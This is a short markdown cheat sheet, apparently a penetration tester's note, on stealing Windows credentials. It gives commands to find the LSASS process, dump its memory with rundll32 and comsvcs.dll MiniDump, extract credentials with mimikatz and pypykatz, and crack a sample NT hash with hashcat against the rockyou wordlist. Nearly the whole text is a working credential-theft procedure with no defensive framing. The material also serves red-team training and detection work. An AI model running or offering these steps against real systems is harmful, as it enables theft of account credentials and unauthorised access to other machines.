# Dumping LSASS process memory 
#### Method 1: 
- Task manager > find & right click on "local security authority" > create dump file 
#### Method 2: 
- **Finding LSASS PID**
```
tasklist /svc | findstr /I lsass
```
```
Get-Process lsass
```
- **Creating LSASS dump (PowerShell)**
```
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 684 'C:\temp\lsass.dmp' full
```
---
# Using pypykatz to Extracting credentials (from lsass dump file) 
#### MimiKatz (only run on windows) 
```
privilege::debug
```
```
lsadump::lsa /patch
```
#### pypykatz 
```
pypykatz lsa minidump /home/peter/Documents/lsass.dmp
```
---
# Cracking the NT hash 
```
hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```